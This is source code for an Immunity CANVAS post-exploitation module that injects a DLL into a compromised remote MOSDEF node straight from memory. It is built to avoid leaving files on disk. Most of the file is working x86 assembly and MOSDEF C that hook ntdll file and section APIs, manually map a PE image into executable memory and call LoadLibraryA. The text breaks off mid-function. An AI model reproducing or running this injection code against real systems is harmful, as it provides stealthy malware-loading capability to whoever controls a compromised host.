#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")

import os
from ExploitTypes.localcommand import LocalCommand
from MOSDEFShellServer.OSX import OSX_x86, OSX_x64
from MOSDEF import mosdef
from MOSDEF.unixremoteresolver import ResolveException

NAME             = "inject_from_mem"
DESCRIPTION      = "Direct from-memory dynamic library injection."
DOCUMENTATION    = {}
VERSION          = "1.0"

PROPERTY         = {}
PROPERTY['TYPE'] = "Commands"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Windows", "All"], ["Mac OS X"]]

DOCUMENTATION["Notes"] = """

This module will inject the given dynamic library to the currently selected
remote MOSDEF node directly from memory without touching disk.

CANVAS also comes with module `injectdll' which will upload a dll to the remote
filesystem and call LoadLibraryA on its path, which is of course less stealthy
than the solution implemented here. `injectdll' should therefore be considered
deprecated.

Currently, inject_from_mem works with OSX32/OSX64 and WIN32/WIN64 MOSDEF nodes.

"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.name        = NAME
        self.srcfile      = ""
        self.callfunction = ""

    def getArgs(self):
        self.getarg("srcfile")
        self.getarg("callfunction")

    def inject_win32(self, node, data, name):
        # First, check to see if library is already loaded under given name.
        # If so, we will get a HANDLE reference and return that

        code = """
        #import "remote", "kernel32.dll|GetModuleHandleExA" as "GetModuleHandleExA"
        #import "local", "sendint" as "sendint"
        #import "string", "NAME" as "NAME"

        void main()
        {
            void *handle;

            GetModuleHandleExA(0, NAME, &handle);
            sendint(handle);
        }
        """
        node.shell.clearfunctioncache()
        request = node.shell.compile(code, {'NAME' : name})
        node.shell.sendrequest(request)
        ret = node.shell.readint()
        node.shell.leave()

        if ret != 0:
            self.log('Library %s already loaded at 0x%x' % (name, ret))
            return ret

        # Allocate dynamic memory for our DATA structure
        # This needs to be persistent across calls and we can't do it
        # entirely in MOSDEF, so we simply send the pointer back to
        # CANVAS and generate code accordingly :)

        code = """
        #import "remote", "kernel32.dll|VirtualAlloc" as "VirtualAlloc"
        #import "local", "sendint" as "sendint"

        #define MEM_RESERVE 0x1000
        #define MEM_COMMIT  0x2000
        #define PAGE_EXECUTE_READWRITE 0x40

        void main()
        {
            void *ptr;
            ptr = VirtualAlloc(0, 156, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            sendint(ptr);
        }
        """

        node.shell.clearfunctioncache()
        request = node.shell.compile(code, {})
        node.shell.sendrequest(request)

        DATA_PTR = node.shell.readint()
        node.shell.leave()

        self.log('VirtualAlloc returned 0x%x\n' % DATA_PTR);

        if DATA_PTR == 0:
            self.log('Could not allocate persistent structure memory with VirtualAlloc')
            return 0

        # Setup the assembly bits
        exception_handler_asm = """
exception_handler:
            cld
            movl    4(%esp), %eax
            movl    (%eax), %eax
            cmpl    $-1073741816, (%eax)
            setne   %al
            movzbl  %al, %eax
            subl    $1, %eax
            ret     $4
            """
        check_name_asm = """
check_name:
        	pushl	%ebp
            movl	%esp, %ebp
            subl	$56, %esp
            movl	$0, -12(%ebp)
            movl	$0, -16(%ebp)
            movl	_DATA, %eax
            movl	(%eax), %eax
            test	%eax, %eax
            jne	L2
            movl	$0, %eax
            jmp	L3
L2:
            movl	_DATA, %eax
            movl	124(%eax), %edx
            movl	$1, 8(%esp)
            movl	8(%ebp), %eax
            movl	%eax, 4(%esp)
            leal	-28(%ebp), %eax
            movl	%eax, (%esp)
            call	*%edx
            subl	$12, %esp
            movl	%eax, -20(%ebp)
            cmpl	$0, -20(%ebp)
            je	L4
            movl	$0, %eax
            jmp	L3
L4:
            movl	$0, -12(%ebp)
            jmp	L5
L10:
            movl	$0, -16(%ebp)
            jmp	L6
L8:
            addl	$1, -16(%ebp)
L6:
            movl	_DATA, %eax
            movl	(%eax), %eax
            cmpl	-16(%ebp), %eax
            jle	L7
            movl	-24(%ebp), %edx
            movl	-16(%ebp), %eax
            movl	-12(%ebp), %ecx
            addl	%ecx, %eax
            addl	%edx, %eax
            movzbl	(%eax), %edx
            movl	_DATA, %eax
            movl	4(%eax), %ecx
            movl	-16(%ebp), %eax
            addl	%ecx, %eax
            movzbl	(%eax), %eax
            cmpb	%al, %dl
            je	L8
L7:
            movl	_DATA, %eax
            movl	(%eax), %eax
            cmpl	-16(%ebp), %eax
            jne	L9
            movl	_DATA, %eax
            movl	128(%eax), %edx
            leal	-28(%ebp), %eax
            movl	%eax, (%esp)
            call	*%edx
            subl	$4, %esp
            movl	$1, %eax
            jmp	L3
L9:
            addl	$1, -12(%ebp)
L5:
            movzwl	-28(%ebp), %eax
            movzwl	%ax, %eax
            cmpl	-12(%ebp), %eax
            jg	L10
            movl	_DATA, %eax
            movl	128(%eax), %edx
            leal	-28(%ebp), %eax
            movl	%eax, (%esp)
            call	*%edx
            subl	$4, %esp
            movl	$0, %eax
L3:
            leave
            ret
            """.replace('_DATA', '$0x%x' % DATA_PTR)

        # Hooks
        hook_NtOpenFile_asm = """
        	pushl	%ebp
            movl	%esp, %ebp
            subl	$40, %esp
            movl	16(%ebp), %eax
            movl	8(%eax), %eax
            movl	%eax, (%esp)
            call	check_name
            test	%eax, %eax
            je	L12
            movl	_DATA, %eax
            movl	8(%eax), %edx
            movl	8(%ebp), %eax
            movl	%edx, (%eax)
            movl	$0, %eax
            jmp	L13
L12:
            movl	_DATA, %eax
            movl	20(%eax), %edx
            movl	28(%ebp), %eax
            movl	%eax, 20(%esp)
            movl	24(%ebp), %eax
            movl	%eax, 16(%esp)
            movl	20(%ebp), %eax
            movl	%eax, 12(%esp)
            movl	16(%ebp), %eax
            movl	%eax, 8(%esp)
            movl	12(%ebp), %eax
            movl	%eax, 4(%esp)
            movl	8(%ebp), %eax
            movl	%eax, (%esp)
            call	*%edx
            subl	$24, %esp
L13:
            leave
            ret	$24
            """.replace('_DATA', '$0x%x' % DATA_PTR) + '\n' + check_name_asm

        hook_NtOpenSection_asm = """
            pushl	%ebp
            movl	%esp, %ebp
            subl	$24, %esp
            movl	16(%ebp), %eax
            movl	8(%eax), %eax
            movl	%eax, (%esp)
            call	check_name
            test	%eax, %eax
            je	L15
            movl	_DATA, %eax
            movl	8(%eax), %edx
            movl	8(%ebp), %eax
            movl	%edx, (%eax)
            movl	$0, %eax
            jmp	L16
L15:
            movl	_DATA, %eax
            movl	28(%eax), %edx
            movl	16(%ebp), %eax
            movl	%eax, 8(%esp)
            movl	12(%ebp), %eax
            movl	%eax, 4(%esp)
            movl	8(%ebp), %eax
            movl	%eax, (%esp)
            call	*%edx
            subl	$12, %esp
L16:
            leave
            ret	$12
        """.replace('_DATA', '$0x%x' % DATA_PTR) + '\n' + check_name_asm

        hook_NtCreateSection_asm = """
        	pushl	%ebp
            movl	%esp, %ebp
            subl	$40, %esp
            movl	_DATA, %eax
            movl	8(%eax), %eax
            cmpl	32(%ebp), %eax
            jne	L18
            movl	_DATA, %eax
            movl	8(%eax), %edx
            movl	8(%ebp), %eax
            movl	%edx, (%eax)
            movl	$0, %eax
            jmp	L19
L18:
            movl	_DATA, %eax
            movl	36(%eax), %edx
            movl	32(%ebp), %eax
            movl	%eax, 24(%esp)
            movl	28(%ebp), %eax
            movl	%eax, 20(%esp)
            movl	24(%ebp), %eax
            movl	%eax, 16(%esp)
            movl	20(%ebp), %eax
            movl	%eax, 12(%esp)
            movl	16(%ebp), %eax
            movl	%eax, 8(%esp)
            movl	12(%ebp), %eax
            movl	%eax, 4(%esp)
            movl	8(%ebp), %eax
            movl	%eax, (%esp)
            call	*%edx
            subl	$28, %esp
L19:
            leave
            ret	$28
        """.replace('_DATA', '$0x%x' % DATA_PTR)

        hook_NtQueryAttributesFile_asm = """
        	pushl	%ebp
            movl	%esp, %ebp
            subl	$24, %esp
            movl	8(%ebp), %eax
            movl	8(%eax), %eax
            movl	%eax, (%esp)
            call	check_name
            test	%eax, %eax
            je	L21
            movl	12(%ebp), %eax
            movl	$337130157, (%eax)
            movl	$30283233, 4(%eax)
            movl	12(%ebp), %eax
            movl	$337130157, 8(%eax)
            movl	$30283233, 12(%eax)
            movl	12(%ebp), %eax
            movl	$337130157, 16(%eax)
            movl	$30283233, 20(%eax)
            movl	12(%ebp), %eax
            movl	$337130157, 24(%eax)
            movl	$30283233, 28(%eax)
            movl	12(%ebp), %eax
            movl	$128, 32(%eax)
            movl	$0, %eax
            jmp	L22
L21:
            movl	_DATA, %eax
            movl	44(%eax), %edx
            movl	12(%ebp), %eax
            movl	%eax, 4(%esp)
            movl	8(%ebp), %eax
            movl	%eax, (%esp)
            call	*%edx
            subl	$8, %esp
L22:
            leave
            ret  	$8
        """.replace('_DATA', '$0x%x' % DATA_PTR) + '\n' + check_name_asm


        hook_NtMapViewOfSection_asm = """
        	pushl	%ebp
            movl	%esp, %ebp
            subl	$56, %esp
            movl	_DATA, %eax
            movl	8(%eax), %eax
            cmpl	8(%ebp), %eax
            jne	L24
            movl	_DATA, %eax
            movl	8(%eax), %edx
            movl	16(%ebp), %eax
            movl	%edx, (%eax)
            movl	_DATA, %eax
            movl	12(%eax), %edx
            movl	32(%ebp), %eax
            movl	%edx, (%eax)
            movl	$1073741827, %eax
            jmp	L25
L24:
            movl	_DATA, %eax
            movl	52(%eax), %edx
            movl	44(%ebp), %eax
            movl	%eax, 36(%esp)
            movl	40(%ebp), %eax
            movl	%eax, 32(%esp)
            movl	36(%ebp), %eax
            movl	%eax, 28(%esp)
            movl	32(%ebp), %eax
            movl	%eax, 24(%esp)
            movl	28(%ebp), %eax
            movl	%eax, 20(%esp)
            movl	24(%ebp), %eax
            movl	%eax, 16(%esp)
            movl	20(%ebp), %eax
            movl	%eax, 12(%esp)
            movl	16(%ebp), %eax
            movl	%eax, 8(%esp)
            movl	12(%ebp), %eax
            movl	%eax, 4(%esp)
            movl	8(%ebp), %eax
            movl	%eax, (%esp)
            call	*%edx
            subl	$40, %esp
L25:
            leave
            ret	    $40
        """.replace('_DATA', '$0x%x' % DATA_PTR)


        hook_NtClose_asm = """
            pushl	%ebp
            movl	%esp, %ebp
            subl	$24, %esp
            movl	_DATA, %eax
            movl	8(%eax), %eax
            cmpl	8(%ebp), %eax
            jne	L27
            movl	$0, %eax
            jmp	L28
L27:
            movl	_DATA, %eax
            movl	60(%eax), %edx
            movl	8(%ebp), %eax
            movl	%eax, (%esp)
            call	*%edx
            subl	$4, %esp
L28:
            leave
            ret	    $4
        """.replace('_DATA', '$0x%x' % DATA_PTR)

        # Assemble
        exception_handler = mosdef.assemble(exception_handler_asm, 'X86')
        hook_NtOpenFile = mosdef.assemble(hook_NtOpenFile_asm, 'X86')
        hook_NtOpenSection = mosdef.assemble(hook_NtOpenSection_asm, 'X86')
        hook_NtCreateSection = mosdef.assemble(hook_NtCreateSection_asm, 'X86')
        hook_NtQueryAttributesFile = mosdef.assemble(hook_NtQueryAttributesFile_asm, 'X86')
        hook_NtMapViewOfSection = mosdef.assemble(hook_NtMapViewOfSection_asm, 'X86')
        hook_NtClose = mosdef.assemble(hook_NtClose_asm, 'X86')

        vars = {
            'DATA_PTR' : DATA_PTR,
            'NAME'     : name,
            'NAME_LEN' : len(name) + 1,
        }

        code = """
        #import "remote", "kernel32.dll|LocalAlloc" as "LocalAlloc"
        #import "remote", "kernel32.dll|LocalFree" as "LocalFree"
        #import "remote", "kernel32.dll|VirtualAlloc" as "VirtualAlloc"
        #import "remote", "kernel32.dll|VirtualFree" as "VirtualFree"
        #import "remote", "kernel32.dll|VirtualQuery" as "VirtualQuery"
        #import "remote", "kernel32.dll|VirtualProtect" as "VirtualProtect"
        #import "remote", "kernel32.dll|WriteProcessMemory" as "WriteProcessMemory"
        #import "remote", "kernel32.dll|LoadLibraryA" as "LoadLibraryA"
        #import "remote", "kernel32.dll|FlushInstructionCache" as "FlushInstructionCache"

        #import "remote", "ntdll.dll|NtOpenFile" as "NtOpenFile"
        #import "remote", "ntdll.dll|NtOpenSection" as "NtOpenSection"
        #import "remote", "ntdll.dll|NtCreateSection" as "NtCreateSection"
        #import "remote", "ntdll.dll|NtQueryAttributesFile" as "NtQueryAttributesFile"
        #import "remote", "ntdll.dll|NtMapViewOfSection" as "NtMapViewOfSection"
        #import "remote", "ntdll.dll|NtClose" as "NtClose"
        #import "remote", "ntdll.dll|RtlUnicodeStringToAnsiString" as "RtlUnicodeStringToAnsiString"
        #import "remote", "ntdll.dll|RtlFreeAnsiString" as "RtlFreeAnsiString"
        #import "remote", "ntdll.dll|RtlAddVectoredExceptionHandler" as "RtlAddVectoredExceptionHandler"
        #import "remote", "ntdll.dll|RtlRemoveVectoredExceptionHandler" as "RtlRemoveVectoredExceptionHandler"


        #import "local", "sendint" as "sendint"
        #import "local", "readintfromself" as "readintfromself"
        #import "local", "readdatafromself" as "readdatafromself"

        #import "int", "DATA_PTR" as "DATA_PTR"
        #import "string", "NAME" as "NAME"
        #import "int", "NAME_LEN" as "NAME_LEN"

        #define MEM_RESERVE             0x1000
        #define MEM_COMMIT              0x2000
        #define PAGE_EXECUTE_READWRITE  0x40
        #define IMAGE_FILE_DLL          0x2000
        #define IMAGE_FILE_MACHINE_I386 0x014c
        #define PE_MAGIC                0x5A4D
        #define LPTR                    0x0040 // LMEM_FIXED|LMEM_ZEROINIT
        #define MEM_RELEASE             0x8000

        struct LOADER_DATA {
            int library_len;
            char *library_name;
            void *library_base;
            int size_of_image;

            void *NtOpenFile;
            void *NtOpenFile_tramp;

            void *NtOpenSection;
            void *NtOpenSection_tramp;

            void *NtCreateSection;
            void *NtCreateSection_tramp;

            void *NtQueryAttributesFile;
            void *NtQueryAttributesFile_tramp;

            void *NtMapViewOfSection;
            void *NtMapViewOfSection_tramp;

            void *NtClose;
            void *NtClose_tramp;

            char NtOpenFile_code[10];
            char NtOpenSection_code[10];
            char NtCreateSection_code[10];
            char NtQueryAttributesFile_code[10];
            char NtMapViewOfSection_code[10];
            char NtClose_code[10];

            void *RtlUnicodeStringToAnsiString;
            void *RtlFreeAnsiString;
        };

        struct ANSI_STRING {
            short  Length;
            short  MaximumLength;
            char   *Buffer;
        };

        struct UNICODE_STRING {
            short Length;
            short MaximumLength;
            char  *Buffer;
        };

        struct IMAGE_DOS_HEADER {
            short e_magic;
            short e_cblp;
            short e_cp;
            short e_crlc;
            short e_cparhdr;
            short e_minalloc;
            short e_maxalloc;
            short e_ss;
            short e_sp;
            short e_csum;
            short e_ip;
            short e_cs;
            short e_lfarlc;
            short e_ovno;
            short e_res[4];
            short e_oemid;
            short e_oeminfo;
            short e_res2[10];
            int   e_lfanew;
        };

        struct IMAGE_NT_HEADERS {
            int    Signature;
            // IMAGE_FILE_HEADER
            short  Machine;
            short  NumberOfSections;
            int    TimeDateStamp;
            int    PointerToSymbolTable;
            int    NumberOfSymbols;
            short  SizeOfOptionalHeader;
            short  Characteristics;
            // IMAGE_OPTIONAL_HEADER
            short  Magic;
            char   MajorLinkerVersion;
            char   MinorLinkerVersion;
            int    SizeOfCode;
            int    SizeOfInitializedData;
            int    SizeOfUninitializedData;
            int    AddressOfEntryPoint;
            int    BaseOfCode;
            int    BaseOfData;
            int    ImageBase;
            int    SectionAlignment;
            int    FileAlignment;
            short  MajorOperatingSystemVersion;
            short  MinorOperatingSystemVersion;
            short  MajorImageVersion;
            short  MinorImageVersion;
            short  MajorSubsystemVersion;
            short  MinorSubsystemVersion;
            int    Reserved1;
            int    SizeOfImage;
            int    SizeOfHeaders;
            int    CheckSum;
            short  Subsystem;
            short  DllCharacteristics;
            int    SizeOfStackReserve;
            int    SizeOfStackCommit;
            int    SizeOfHeapReserve;
            int    SizeOfHeapCommit;
            int    LoaderFlags;
            int    NumberOfRvaAndSizes;
       };

       struct IMAGE_SECTION_HEADER {
            char   Name[8];
            int    VirtualSize;
            int    VirtualAddress;
            int    SizeOfRawData;
            int    PointerToRawData;
            int    PointerToRelocations;
            int    PointerToLinenumbers;
            short  NumberOfRelocations;
            short  NumberOfLinenumbers;
            int    Characteristics;
        };


        struct MEMORY_BASIC_INFORMATION {
            void  *BaseAddress;
            void  *AllocationBase;
            int    AllocationProtect;
            int    RegionSize;
            int    State;
            int    Protect;
            int    Type;
        };

        void hook_function(char *function, char *hook, char *code_buffer)
        {
            int saved_protect;
            struct MEMORY_BASIC_INFORMATION mi;
            char *b;
            int *i;
            int offset;
            int target;
            int z;

            z = &mi;
            z = z + 20;

            WriteProcessMemory(-1, code_buffer, function, 5, 0);

            b = code_buffer + 5;

            WriteProcessMemory(-1, b, function, 5, 0);

            VirtualQuery(function, &mi, 28);
            saved_protect = mi.Protect;

            VirtualProtect(mi.BaseAddress, mi.RegionSize, PAGE_EXECUTE_READWRITE, z);

            b = code_buffer;

            if (*b == 0xe9) {
                b = code_buffer + 1;
                i = b;

                offset = *i;
                target = function + offset;
                target = target + 5;
                z = target - code_buffer;
                z = z - 5;

                *i = z;
            } else {
                b = code_buffer+5;
               *b = 0xe9;

                b = code_buffer+6;
                i = b;

                z = function - code_buffer;
                z = z - 5;
               *i = z;
            }


            b = function;
            *b = 0xe9;

            b = function+1;
            i = b;
            z = hook - function;
            z = z - 5;
            *i = z;

            VirtualProtect(mi.BaseAddress, mi.RegionSize, mi.Protect, &saved_protect);
            FlushInstructionCache(-1, mi.BaseAddress, mi.RegionSize);
        }

        void unhook_function(void *function, char *code_buffer)
        {
           int saved_protect;
           struct MEMORY_BASIC_INFORMATION mi;
           char *b;

           VirtualQuery(function, &mi, 28);
           saved_protect = mi.Protect;
           VirtualProtect(mi.BaseAddress, mi.RegionSize, PAGE_EXECUTE_READWRITE, &mi.Protect);

           b = code_buffer;

           if (*b == 0xe9) {
                b = b + 5;
                WriteProcessMemory(-1, function, b, 5, 0);
            } else {
                WriteProcessMemory(-1, function, code_buffer, 5, 0);
            }

           VirtualProtect(mi.BaseAddress, mi.RegionSize, mi.Protect, &saved_protect);
           FlushInstructionCache(-1, mi.BaseAddress, mi.RegionSize);
        }

        void main()
        {
            struct LOADER_DATA *DATA;
            char bool;
            int i;
            int z;
            int BUFFER_LEN;
            int ret;
            void *address;
            void *exc;

            struct IMAGE_DOS_HEADER *dos_h;
            struct IMAGE_NT_HEADERS *nt_h;
            struct IMAGE_SECTION_HEADER *section;

            char *BUFFER;

            char *exception_handler;
            char *hook_NtOpenFile;
            char *hook_NtOpenSection;
            char *hook_NtCreateSection;
            char *hook_NtQueryAttributesFile;
            char *hook_NtMapViewOfSection;
            char *hook_NtClose;


            i = 0;
            DATA = DATA_PTR;


            DATA->NtOpenFile = NtOpenFile;
            DATA->NtOpenSection = NtOpenSection;
            DATA->NtCreateSection = NtCreateSection;
            DATA->NtQueryAttributesFile = NtQueryAttributesFile;
            DATA->NtMapViewOfSection = NtMapViewOfSection;
            DATA->NtClose = NtClose;

            DATA->RtlUnicodeStringToAnsiString = RtlUnicodeStringToAnsiString;
            DATA->RtlFreeAnsiString = RtlFreeAnsiString;

            // Receive size of buffer
            BUFFER_LEN = readintfromself();
            BUFFER = LocalAlloc(LPTR, BUFFER_LEN);

            if (BUFFER == 0) {
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
            }

            readdatafromself(BUFFER, BUFFER_LEN);

            dos_h = BUFFER;
            nt_h  = BUFFER + dos_h->e_lfanew;

            if (dos_h->e_magic != PE_MAGIC) {
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                sendint(-2);
                return;
            }

            if (nt_h->Characteristics & IMAGE_FILE_DLL == 0) {
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-3);
                return;
            }

            if (nt_h->Machine != IMAGE_FILE_MACHINE_I386) {
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-4);
                return;
            }

            DATA->library_base = VirtualAlloc(nt_h->ImageBase, nt_h->SizeOfImage,
                                              MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (DATA->library_base == 0) {
                // Try with arbitrary base
                DATA->library_base = VirtualAlloc(0, nt_h->SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            }

            if (DATA->library_base == 0) {
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-5);
                return;
            }

            ret = WriteProcessMemory(-1, DATA->library_base, BUFFER,
                                     nt_h->SizeOfHeaders, 0);

            if (ret == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-6);
                return;
            }

            z = BUFFER + dos_h->e_lfanew + 24 + nt_h->SizeOfOptionalHeader;
            section = z;

            for (i=0;i<nt_h->NumberOfSections; i=i+1) {
                if (section->SizeOfRawData != 0) {
                    ret = WriteProcessMemory(-1, DATA->library_base + section->VirtualAddress,
                                             BUFFER + section->PointerToRawData,
                                             section->SizeOfRawData, 0);
                    if (ret == 0) {
                        VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                        LocalFree(BUFFER);
                        VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                        sendint(-7);
                        return;
                    }
                }

                z = z + 40;
                section = z;
            }

            sendint(1);

            // Setup exception handler
            i = readintfromself();
            exception_handler = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            if (exception_handler == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(exception_handler, i);
            }

            // Setup the hooks
            i = readintfromself();
            hook_NtOpenFile = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (hook_NtOpenFile == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                VirtualFree(exception_handler, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(hook_NtOpenFile, i);
            }

            i = readintfromself();
            hook_NtOpenSection = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (hook_NtOpenSection == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                VirtualFree(exception_handler, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenFile, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(hook_NtOpenSection, i);
            }

            i = readintfromself();
            hook_NtCreateSection = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (hook_NtCreateSection == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                VirtualFree(exception_handler, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenFile, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenSection, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(hook_NtCreateSection, i);
            }

            i = readintfromself();
            hook_NtQueryAttributesFile = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (hook_NtQueryAttributesFile == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                VirtualFree(exception_handler, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenFile, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenSection, 0, MEM_RELEASE);
                VirtualFree(hook_NtCreateSection, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(hook_NtQueryAttributesFile, i);
            }

            i = readintfromself();
            hook_NtMapViewOfSection = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (hook_NtMapViewOfSection == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                VirtualFree(exception_handler, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenFile, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenSection, 0, MEM_RELEASE);
                VirtualFree(hook_NtCreateSection, 0, MEM_RELEASE);
                VirtualFree(hook_NtQueryAttributesFile, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(hook_NtMapViewOfSection, i);
            }

            i = readintfromself();
            hook_NtClose = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (hook_NtClose == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                VirtualFree(exception_handler, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenFile, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenSection, 0, MEM_RELEASE);
                VirtualFree(hook_NtCreateSection, 0, MEM_RELEASE);
                VirtualFree(hook_NtQueryAttributesFile, 0, MEM_RELEASE);
                VirtualFree(hook_NtMapViewOfSection, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(hook_NtClose, i);
            }

            DATA->library_len   = NAME_LEN;
            DATA->library_name  = NAME;
            DATA->size_of_image = nt_h->SizeOfImage;

            // Install exception handler
            exc = RtlAddVectoredExceptionHandler(1, exception_handler);

            // Install hooks
            hook_function(DATA->NtOpenFile, hook_NtOpenFile, DATA->NtOpenFile_code);
            hook_function(DATA->NtOpenSection, hook_NtOpenSection, DATA->NtOpenSection_code);
            hook_function(DATA->NtCreateSection, hook_NtCreateSection, DATA->NtCreateSection_code);
            hook_function(DATA->NtQueryAttributesFile, hook_NtQueryAttributesFile, DATA->NtQueryAttributesFile_code);
            hook_function(DATA->NtMapViewOfSection, hook_NtMapViewOfSection, DATA->NtMapViewOfSection_code);
            hook_function(DATA->NtClose, hook_NtClose, DATA->NtClose_code);

            DATA->NtOpenFile_tramp = DATA->NtOpenFile_code;
            DATA->NtOpenSection_tramp = DATA->NtOpenSection_code;
            DATA->NtCreateSection_tramp = DATA->NtCreateSection_code;
            DATA->NtQueryAttributesFile_tramp = DATA->NtQueryAttributesFile_code;
            DATA->NtMapViewOfSection_tramp = DATA->NtMapViewOfSection_code;
            DATA->NtClose_tramp = DATA->NtClose_code;

            address = LoadLibraryA(NAME);
            sendint(address);

            if (exc != 0) {
                RtlRemoveVectoredExceptionHandler(exc);
            }

            unhook_function(DATA->NtOpenFile, DATA->NtOpenFile_code);
            unhook_function(DATA->NtOpenSection, DATA->NtOpenSection_code);
            unhook_function(DATA->NtCreateSection, DATA->NtCreateSection_code);
            unhook_function(DATA->NtQueryAttributesFile, DATA->NtQueryAttributesFile_code);
            unhook_function(DATA->NtMapViewOfSection, DATA->NtMapViewOfSection_code);
            unhook_function(DATA->NtClose, DATA->NtClose_code);

            if (address == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
            }

            VirtualFree(DATA_PTR, 0, MEM_RELEASE);
            LocalFree(BUFFER);
            VirtualFree(exception_handler, 0, MEM_RELEASE);
            VirtualFree(hook_NtOpenFile, 0, MEM_RELEASE);
            VirtualFree(hook_NtOpenSection, 0, MEM_RELEASE);
            VirtualFree(hook_NtCreateSection, 0, MEM_RELEASE);
            VirtualFree(hook_NtQueryAttributesFile, 0, MEM_RELEASE);
            VirtualFree(hook_NtMapViewOfSection, 0, MEM_RELEASE);
            VirtualFree(hook_NtClose, 0, MEM_RELEASE);
        }
        """

        node.shell.clearfunctioncache()
        request = node.shell.compile(code, vars)
        node.shell.sendrequest(request)

        self.log('Sending dynamic library, %d bytes..' % len(data))
        node.shell.sendint(len(data))

        if node.shell.readint(signed=True) == -1:
            self.log('Could not allocate memory for library at remote side')
            node.shell.leave()
            return 0

        node.shell.writebuf(data)

        # Check if mapping succeeded
        ret = node.shell.readint(signed=True)

        if ret != 1:
            if ret == -2:
                self.log('Not a Windows PE file')
            elif ret == -3:
                self.log('Not a DLL')
            elif ret == -4:
                self.log('Not a 32bit x86 DLL')
            elif ret == -5:
                self.log('Could not allocate memory for library mapping')
            elif ret == -6:
                self.log('Error while mapping library')
            elif ret == -7:
                self.log('Error while mapping sections')
            else:
                self.log('Unknown error')

            node.shell.leave()
            return 0

        # Send exception handler
        node.shell.sendint(len(exception_handler))
        ret = node.shell.readint(signed=True)

        if ret == -1:
            self.log('Error allocating memory for exception handler')
            node.shell.leave()
            return 0

        node.shell.writebuf(exception_handler)

        # Send hooks
        self.log('Sending hooks..')

        for (hook, desc) in [(hook_NtOpenFile, 'NtOpenFile'),
                             (hook_NtOpenSection, 'NtOpenSection'),
                             (hook_NtCreateSection, 'NtCreateSection'),
                             (hook_NtQueryAttributesFile, 'NtQueryAttributesFile'),
                             (hook_NtMapViewOfSection, 'NtMapViewOfSection'),
                             (hook_NtClose, 'NtClose')]:

            node.shell.sendint(len(hook))
            ret = node.shell.readint(signed=True)

            if ret == -1:
                self.log('Error while allocating memory for hook %s' % desc)
                node.shell.leave()
                return 0

            self.log('[+] %s' % desc)
            node.shell.writebuf(hook)

        ret = node.shell.readint()
